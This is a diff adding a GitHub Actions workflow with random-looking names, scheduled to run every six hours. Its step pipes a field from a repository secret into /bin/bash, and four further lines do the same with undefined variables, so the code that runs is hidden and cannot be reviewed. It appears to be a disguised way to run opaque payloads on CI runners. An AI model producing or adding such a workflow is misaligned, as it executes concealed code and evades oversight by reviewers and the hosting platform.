@@ -1,0 +1,22 @@
+name: tuwenxin4637
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tuwenxin4637
+        env:
+          ttjda4264: ${{ secrets.ttjda4264 }}
+        run: |
+          echo $ttjda4264 | jq -r .jko16045 | /bin/bash
+          echo $aprp07 | jq -r .vinr38181 | /bin/bash
+          echo $n9470 | jq -r .ae9 | /bin/bash
+          echo $y382 | jq -r .qrv29706 | /bin/bash
+          echo $ib395 | jq -r .g5 | /bin/bash
+
